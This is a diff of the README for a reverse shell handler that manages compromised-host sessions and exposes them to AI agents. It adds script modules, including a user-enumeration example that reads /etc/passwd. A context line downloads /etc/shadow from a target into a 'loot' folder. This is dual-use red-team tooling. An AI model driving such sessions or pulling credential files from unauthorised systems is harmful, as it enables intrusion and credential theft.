@@ -1,11 +1,12 @@
 # kash
 
-![version](https://img.shields.io/badge/version-0.2.2-blue)
+![version](https://img.shields.io/badge/version-0.3.0-blue)
 ![platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey)
 
 A reverse shell handler written in Rust, with Docker-style session management.
 Start a listener in the background, attach interactively from any terminal. Kash comes with an interface for AI to interact with the same shell as the human.
 Sessions are named after animals (`monkey`, `tiger`, `panda`, …) instead of random blobs so they are easy to type.
+Plain `.sh` / `.ps1` / `.py` script modules (`kash run`) share the same shell as human and agent.
 
 ---
 
@@ -42,6 +43,8 @@ Commands:
   attach    Re-attach an interactive terminal to a detached session
   upload    Upload a local file to a running session's remote system
   download  Download a file from a running session's remote system
+  run       Run a script module in a running session
+  modules   List available script modules
   help      Print this message or the help of the given subcommand(s)
 
 Options:
@@ -60,7 +63,7 @@ kash listen 4444 -d
 ```
 
 ```console
-  kash  ────────────────────────────  v0.2.1  daemon
+  kash  ────────────────────────────  v0.3.0  daemon
 
   obfuscation  : none
   shell type   : auto
@@ -145,7 +148,34 @@ kash download monkey /etc/shadow loot/shadow.txt
 
 Or from inside the session, type `upload` / `download` directly at the prompt. Transfers stream base64 with SHA256 verification, keep remote history clean, and work at any file size.
 
-### 7. End a session
+### 7. Run script modules
+
+```bash
+kash modules                                  # list .sh/.ps1/.py in ./modules or ~/.kash/modules
+kash run enum-users monkey                    # confirm, then run verbatim on target
+kash run s3-enum monkey --set BUCKET=foo --yes
+kash run --format json enum-users monkey --yes  # JSON output for LLMs
+```
+
+Modules are plain scripts — `print`/`echo` is the whole protocol. Small ones go inline, larger ones upload first. `--set` fills `{{VAR}}` placeholders; mismatched shells are rejected before anything runs.
+
+A module is just a file. Drop this in `./modules/enum-users.sh`:
+
+```bash
+# kash-module: shell=linux desc="list local users"
+cut -d: -f1 /etc/passwd | grep -v -e nologin -e false
+```
+
+```bash
+kash run enum-users monkey --yes
+# root
+# daemon
+# www-data
+```
+
+Same shape for PowerShell (`.ps1`, `shell=windows`) and Python (`.py`, needs a linux session with `python3`). Header optional — extension alone picks the runner.
+
+### 8. End a session
 
 ```bash
 kash kill monkey
